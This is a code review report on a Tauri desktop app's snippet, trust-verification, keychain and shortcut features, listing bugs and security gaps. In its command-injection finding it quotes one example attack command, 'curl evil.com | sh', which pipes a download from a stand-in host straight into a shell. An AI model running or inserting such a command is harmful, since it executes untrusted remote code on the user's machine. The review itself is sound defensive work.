# Phase 3 Code Review Report

## Summary

Phase 3 introduces six major subsystems: snippet management (backend + frontend), trust verification, macOS Keychain integration, configurable keyboard shortcuts, model switching, and a settings modal. The overall architecture is sound -- separation of concerns between Rust backend modules and SolidJS frontend components is clean, IPC bindings are consistent, and the trust-verification hash-based approach is well-designed. However, there are several critical issues that must be addressed before shipping, primarily around missing backend commands referenced by the frontend, potential command injection vectors, race conditions in file-based stores, and event listener leaks.

---

## Critical Issues (P0)

### 1. TrustDialog references non-existent backend commands

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/TrustDialog.tsx`:20-21, 31-32
- **Issue**: `handleApprove()` calls `invoke("run_setup_and_start_agent", ...)` and `handleDeny()` calls `invoke("start_agent_no_setup", ...)`. Neither `run_setup_and_start_agent` nor `start_agent_no_setup` exist anywhere in the backend (`commands.rs`, `lib.rs`). They are not registered in `generate_handler![]`. These invocations will always fail at runtime, meaning the entire TrustDialog approve/deny workflow is broken.
- **Fix**: Implement `run_setup_and_start_agent` and `start_agent_no_setup` as Tauri commands in `commands.rs` and register them in `lib.rs`, or refactor `TrustDialog` to use existing commands that accomplish the same goal.

### 2. No command injection sanitization for snippet commands

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/commands.rs`:251, 473
- **Issue**: Both `run_snippet` (line 251) and `run_snippet_v2` (line 473) pass user-defined snippet commands directly to `sh -c` without any validation or sanitization. While snippets are loaded from config files, repo-level snippet files (`.ocestrater/snippets.json`) are checked into repositories and can be modified by any contributor. A malicious repo contributor could craft a snippet command that performs arbitrary code execution (e.g., `curl evil.com | sh`). The trust system partially mitigates this for `run_snippet_v2` (line 449-458), but `run_snippet` (the legacy v1 command) has **no trust check at all**.
- **Fix**: Remove the legacy `run_snippet` command (or add trust checks to it). For `run_snippet_v2`, consider adding a warning or sanitization layer. At minimum, ensure the v1 command cannot be called from the frontend for repo-level snippets without trust verification.

### 3. Trust check race condition (TOCTOU)

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/trust.rs`:99-138 and `/Users/ddingg/dev/work-ocestrater/src-tauri/src/commands.rs`:448-458
- **Issue**: In `run_snippet_v2`, the trust check (`check_trust`) and the snippet execution are not atomic. Between the trust check passing and the snippet command being executed, the snippet file could be modified (e.g., by a `git pull` in another terminal). The trust store file reads are also not protected by any locking mechanism -- concurrent calls to `grant_trust` and `check_trust` could produce inconsistent results due to read-modify-write races on `trust.json`.
- **Fix**: At minimum, re-hash the snippet command at execution time and compare against the trusted hash. For the trust store file, consider wrapping it in a `Mutex<TrustStore>` as a Tauri managed state (similar to how `KeychainStore` and `ShortcutStore` are handled).

### 4. Keychain module has no cross-platform fallback

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/keychain.rs`:1-3
- **Issue**: The `keychain.rs` module unconditionally imports from `security_framework::passwords`, which is macOS-only. While `Cargo.toml` (line 28-29) correctly marks `security-framework` as a `[target.'cfg(target_os = "macos")'.dependencies]`, the `keychain.rs` module itself has no `#[cfg(target_os = "macos")]` guards. The module is unconditionally included via `mod keychain;` in `lib.rs` (line 8). This means the project will fail to compile on Linux or Windows.
- **Fix**: Add `#[cfg(target_os = "macos")]` to the keychain module declaration in `lib.rs`, and provide a stub/mock implementation for other platforms. Also conditionally register the keychain-related commands.

### 5. `trust-required` event is never emitted by the backend

- **File**: `/Users/ddingg/dev/work-ocestrater/src/lib/tauri.ts`:168-174
- **Issue**: The frontend registers a listener for the `"trust-required"` event via `onTrustRequired()`, and `TrustDialog` is presumably displayed when this event fires. However, no backend code anywhere emits the `"trust-required"` event. Grep across the entire `src-tauri/src` directory confirms zero matches. This means the TrustDialog will never be shown to users, and the entire trust flow for workspace creation is disconnected.
- **Fix**: Emit the `"trust-required"` event from the backend, likely in the `create_workspace` command after detecting an untrusted or changed repo.

---

## Important Issues (P1)

### 6. Snippet file operations lack file locking (concurrent access)

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/snippets.rs`:70-77 (save_snippet_file), `/Users/ddingg/dev/work-ocestrater/src-tauri/src/trust.rs`:66-74 (save_trust_store), `/Users/ddingg/dev/work-ocestrater/src-tauri/src/keychain.rs`:85-94 (save_index)
- **Issue**: All three modules perform read-modify-write operations on JSON files without any file-level locking. If two IPC calls happen concurrently (e.g., two rapid snippet saves), one write can clobber the other. Unlike `ShortcutStore` and `KeychainStore` which are wrapped in `Mutex<T>` Tauri state, the snippet and trust modules use free functions that load/save from disk on every call.
- **Fix**: Wrap snippet and trust operations in Tauri managed state with a Mutex, similar to how `KeychainState` and `ShortcutState` are managed. This is especially important for snippets, which can be saved rapidly through the SnippetManager UI.

### 7. `list_keys()` reads from disk instead of cache

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/keychain.rs`:51-53
- **Issue**: `KeychainStore::list_keys()` calls `load_index()` which reads from disk every time, ignoring the in-memory `cache` HashMap. This is inconsistent with the rest of the `KeychainStore` API, which uses the cache. It also means that if the index file is corrupted or deleted while the app is running, `list_keys` will return different results than `get`/`set`/`delete`.
- **Fix**: Return `self.cache.keys().cloned().collect()` instead of re-reading the index file.

### 8. KeychainStore cache grows unbounded

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/keychain.rs`:11-13
- **Issue**: The `KeychainStore.cache` is a `HashMap<String, String>` that loads all secrets into memory on startup and never evicts. While the number of secrets is typically small, there is no upper bound. More importantly, secrets are stored as plaintext strings in memory for the entire application lifetime, which increases the attack surface for memory-dump vulnerabilities.
- **Fix**: Consider limiting the cache size or clearing sensitive values from memory when not actively needed. At minimum, document this as a known security consideration.

### 9. SnippetPalette imports `onCleanup` but never uses it

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SnippetPalette.tsx`:1
- **Issue**: `onCleanup` is imported but never called. The `handleKeyDown` listener is attached to the modal's `onKeyDown` JSX prop, so it is cleaned up automatically by SolidJS. However, this import hints that the developer may have intended to add a global keyboard listener (e.g., for Escape key when focus is outside the modal) but did not complete it. As-is, pressing Escape only works when the modal has focus.
- **Fix**: Either remove the unused `onCleanup` import, or add a global `document.addEventListener("keydown", ...)` with proper cleanup for better UX.

### 10. ModelSelector event listeners may leak

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/ModelSelector.tsx`:40-48, 65-69
- **Issue**: `attachListeners()` and `detachListeners()` are called manually in the onClick handler. However, if the component is unmounted while the dropdown is open, `onCleanup` (line 50) calls `detachListeners()`, which is correct. But there is a subtle bug: if the user clicks the trigger button twice rapidly, `attachListeners` can be called twice without an intervening `detachListeners`, resulting in double-registered event handlers. The `handleClickOutside` and `handleKeyDown` will then fire twice per event.
- **Fix**: Guard `attachListeners` to prevent double-registration, or use a reactive approach with `createEffect` that watches the `open()` signal.

### 11. `run_snippet` (v1) still exists alongside `run_snippet_v2` with different behavior

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/commands.rs`:226-265 vs 429-527
- **Issue**: The legacy `run_snippet` command uses synchronous execution and reads snippets from the old `RepoConfig.snippets` HashMap. The new `run_snippet_v2` uses async execution with streaming output and reads from the new `snippets.rs` system. Both are registered in `lib.rs`. The v1 command has no trust check and blocks the main thread. The frontend `tauri.ts` exports both `runSnippet` (line 111) and `runSnippetV2` (line 132), meaning the old command could still be called.
- **Fix**: Deprecate and remove the v1 `run_snippet` command if it is no longer needed, or clearly document which callers still use it and add trust checks.

### 12. `save_shortcuts` does not emit `shortcuts-updated` event

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/commands.rs`:628-634 and `/Users/ddingg/dev/work-ocestrater/src/components/ShortcutHandler.tsx`:34-41
- **Issue**: `ShortcutHandler` listens for a `"shortcuts-updated"` event to hot-reload shortcut config. However, the `save_shortcuts` command (line 628-634) does not emit this event after saving. The backend never emits `"shortcuts-updated"` anywhere. This means changes to shortcuts will not take effect until the app is restarted.
- **Fix**: After saving shortcuts in the `save_shortcuts` command, emit the `"shortcuts-updated"` event via `app.emit(...)`.

### 13. SettingsModal uses `window.prompt()` for secret input

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SettingsModal.tsx`:154
- **Issue**: `handleSetSuggested()` uses `window.prompt()` to collect secret values. `window.prompt()` shows a plain-text input dialog (not masked), meaning API key values are visible to anyone looking at the screen. Additionally, `window.prompt()` is a blocking call that freezes the renderer and looks out of place in a Tauri desktop application.
- **Fix**: Replace with a proper inline input field or a small modal with a `type="password"` input, consistent with the existing "Add Custom Key" form already in the component.

---

## Suggestions (P2)

### 14. Category badge CSS duplicated between SnippetPalette and SnippetManager

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SnippetPalette.tsx`:270-282 and `/Users/ddingg/dev/work-ocestrater/src/components/SnippetManager.tsx`:548-560
- **Issue**: The `.sp-cat-badge` and `.sp-cat-{category}` CSS rules are copy-pasted identically between both components. The SnippetManager even has a comment on line 547 saying "Category badges - reuse from palette" but then duplicates the entire block.
- **Fix**: Extract category badge styles into a shared CSS file or a shared component.

### 15. Default shortcuts are duplicated between backend and frontend

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/shortcuts.rs`:65-90 and `/Users/ddingg/dev/work-ocestrater/src/components/ShortcutHandler.tsx`:55-73
- **Issue**: The default shortcut mappings are defined in both the Rust backend (`ShortcutStore::default_config`) and the TypeScript frontend (`ShortcutHandler.loadDefaults`). If defaults change in one place, the other will be out of sync. The frontend also is missing `"palette.command": "Cmd+K"` which the backend has.
- **Fix**: Remove the frontend defaults and rely solely on the backend as the source of truth. If the backend load fails, show an error instead of falling back to potentially stale defaults. Or, keep the frontend fallback but generate it from a shared source.

### 16. `normalizeBinding` lowercases the key but `normalizeEvent` sometimes doesn't

- **File**: `/Users/ddingg/dev/work-ocestrater/src/lib/shortcut-parser.ts`:21, 49-53
- **Issue**: In `normalizeBinding`, the key part is always lowercased (line 22: `const key = parts[parts.length - 1].toLowerCase()`). In `normalizeEvent`, the comma key is kept as-is (`if (key === ",") key = ","` on line 51, which is a no-op), space is mapped to `"space"`, and other keys are lowercased. This inconsistency is mostly harmless but the comma check is dead code since it maps `,` to `,`.
- **Fix**: Remove the redundant comma identity mapping on line 51. Consider also mapping `"Tab"` to `"tab"` explicitly in normalizeEvent for clarity, since `e.key` returns `"Tab"` (capitalized) for the Tab key, and the `.toLowerCase()` on line 53 already handles it.

### 17. `ShortcutHandler` does not filter out modifier-only key events

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/ShortcutHandler.tsx`:78-102
- **Issue**: When a user presses just the Cmd key (without another key), `normalizeEvent` will produce `"Cmd+meta"` (since `e.key` is `"Meta"` and `e.metaKey` is true). This won't match any configured shortcut so it's not functionally broken, but it generates unnecessary lookups on every modifier press.
- **Fix**: Add an early return in `handleKeyDown` if `e.key` is a modifier key (`"Control"`, `"Shift"`, `"Alt"`, `"Meta"`).

### 18. `allSecretKeys()` in SettingsModal is computed on every render

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SettingsModal.tsx`:74-83
- **Issue**: `allSecretKeys()` is a regular function that recomputes on every call. In SolidJS, this should be a computed/memo signal for efficiency, especially since it is called multiple times in the render tree (once per `<For>` iteration check).
- **Fix**: Wrap with `createMemo(() => { ... })` for proper memoization.

### 19. `global_snippets_path()` and similar fall back to current directory on `dirs::home_dir()` failure

- **File**: `/Users/ddingg/dev/work-ocestrater/src-tauri/src/snippets.rs`:80-81, `/Users/ddingg/dev/work-ocestrater/src-tauri/src/trust.rs`:37-38, `/Users/ddingg/dev/work-ocestrater/src-tauri/src/keychain.rs`:68-69, `/Users/ddingg/dev/work-ocestrater/src-tauri/src/shortcuts.rs`:59-60
- **Issue**: All four modules use `.unwrap_or_else(|| PathBuf::from("."))` when `dirs::home_dir()` returns `None`. This means config files would silently be written to the current working directory (which varies). This can cause data loss, inconsistent behavior, or even writing sensitive data (secret key index) to unexpected locations.
- **Fix**: Return an error instead of silently falling back. If the home directory cannot be determined, the application should surface this as a startup error rather than proceeding with a potentially arbitrary path.

### 20. `SnippetPalette` does not scroll selected item into view

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SnippetPalette.tsx`:62-78
- **Issue**: When navigating with ArrowDown/ArrowUp, the `selectedIndex` changes but the scroll position of the `.sp-list` container is not adjusted. If there are many snippets, the selected item can scroll out of view.
- **Fix**: After changing `selectedIndex`, use `scrollIntoView()` on the selected element.

### 21. Unused `loading` signal in SettingsModal

- **File**: `/Users/ddingg/dev/work-ocestrater/src/components/SettingsModal.tsx`:48, 61, 70
- **Issue**: The `loading` signal is set to `true` at the start of `loadData()` and `false` in the `finally` block, but it is never read anywhere in the template. No loading indicator is shown to the user.
- **Fix**: Either add a loading spinner/skeleton UI that uses the `loading()` signal, or remove it.

### 22. `saveShortcuts` IPC accepts `shortcuts: ShortcutConfig` but backend expects `config: ShortcutConfig`

- **File**: `/Users/ddingg/dev/work-ocestrater/src/lib/tauri.ts`:237-238 and `/Users/ddingg/dev/work-ocestrater/src-tauri/src/commands.rs`:628-634
- **Issue**: The frontend sends `{ shortcuts: config }` but the Rust command parameter is named `config: ShortcutConfig`. Tauri's IPC layer matches parameters by name. The frontend sends `{ shortcuts }` (line 238 of tauri.ts) but the Rust function expects `config` (line 630 of commands.rs). This will result in a deserialization error at runtime because the parameter name doesn't match.
- **Fix**: Either rename the frontend parameter to `config` (`invoke("save_shortcuts", { config: shortcuts })`) or rename the Rust parameter to `shortcuts`.

---

## Positive Observations

1. **Well-structured trust verification**: The hash-based approach in `trust.rs` using SHA-256 to detect changes in setup scripts and snippet files is a sound design. The `TrustStatus` enum with `Trusted`, `Untrusted`, and `Changed` variants provides clear state management.

2. **Good test coverage in Rust modules**: `snippets.rs`, `trust.rs`, and `config.rs` all have meaningful unit tests covering serialization roundtrips, default values, and edge cases. The `days_to_ymd` date computation tests are particularly thorough.

3. **Clean IPC binding layer**: `tauri.ts` provides a well-organized, type-safe wrapper around Tauri's `invoke` API with proper TypeScript types imported from `types.ts`.

4. **Thoughtful streaming output for snippets**: `run_snippet_v2` streams stdout/stderr via IPC events with 16ms/4KB batching thresholds, which is good for real-time feedback without overwhelming the frontend.

5. **Conflict detection in shortcut parser**: `buildShortcutMap` properly detects and reports binding conflicts, and correctly rejects reserved OS shortcuts (Cmd+Q, Cmd+H, Cmd+M).

6. **Good separation of action registry**: The `action-registry.ts` pattern of registering named actions decoupled from keybindings is a clean architecture that enables both keyboard shortcuts and programmatic invocation.

7. **SolidJS reactive patterns used correctly**: Store updates in `workspace-store.ts` use SolidJS's fine-grained reactivity model correctly with path-based `setState` calls.

8. **Secret auto-hide timer**: The 5-second auto-hide for revealed secrets in `SettingsModal` is a nice security UX touch.

---

## Test Coverage Gaps

1. **No integration tests for IPC commands**: The Tauri commands in `commands.rs` have no tests. These are the primary entry points for all frontend interaction and should have integration tests verifying parameter handling, error paths, and state consistency.

2. **No tests for `shortcut-parser.ts`**: The normalization logic (`normalizeBinding`, `normalizeEvent`, `buildShortcutMap`) has zero test coverage. Edge cases like duplicate modifiers, case variations, and special keys should be tested.

3. **No tests for `keychain.rs`**: The keychain module has no tests at all. While Keychain operations are hard to unit test, at minimum the index file management (`load_index`, `save_index`, `add_to_index`, `remove_from_index`) can be tested with temp directories.

4. **No tests for `shortcuts.rs`**: The `ShortcutStore` has no tests for load/save operations or default config generation.

5. **Trust verification end-to-end**: While `trust.rs` has unit tests for serialization, there are no tests for the actual trust-check logic (`check_trust`, `grant_trust`, `revoke_trust`) with real file system state changes.

6. **Frontend component tests**: None of the SolidJS components have any tests. The snippet palette keyboard navigation, trust dialog approve/deny flow, and model selector dropdown behavior are all untested.

7. **Concurrent access tests**: Given the file-based stores, there should be stress tests verifying that concurrent save operations don't corrupt data.

---

## Verdict

**PASS WITH FIXES**

The architecture is solid and the code quality is generally good, but there are five critical issues (P0) that must be fixed before shipping:

1. **TrustDialog calls non-existent backend commands** -- the trust approval flow is completely broken.
2. **Legacy `run_snippet` has no trust check** -- security gap for repo-level snippets.
3. **Trust check TOCTOU race** -- trust can be bypassed between check and execution.
4. **Keychain module won't compile on non-macOS** -- no platform guards.
5. **`trust-required` event is never emitted** -- trust dialog will never appear.

Additionally, the P1 issue #22 (parameter name mismatch in `save_shortcuts`) will cause the shortcut save functionality to fail at runtime and should be treated as a blocker.

Once these are resolved, the codebase is in good shape for release.
